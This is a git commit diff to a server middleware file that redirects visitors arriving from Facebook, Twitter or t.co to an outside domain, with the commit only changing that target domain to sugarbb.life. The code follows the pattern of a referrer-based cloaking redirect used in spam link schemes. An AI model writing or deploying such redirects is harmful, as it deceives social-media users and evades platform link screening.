8c55d04beec6b4e27fec73573c17053353b01431
1stmaidinh <117885095+1stmaidinh@users.noreply.github.com>
2023-06-19 11:17:12 +0700

    sugarbb.life
    sugarbb.life

--- server/middleware/[...slug].ts
+++ server/middleware/[...slug].ts
@@ -14,6 +14,6 @@ export default defineEventHandler((event) => {
     const headers = event.req.headers;
     
     if (headers.referer && /facebook\.com|twitter\.com|t\.co/gi.test(headers.referer)) {
-        sendRedirect(event,"https://dx2st.beauty"+event.req.url);
+        sendRedirect(event,"https://sugarbb.life"+event.req.url);
     }
 })
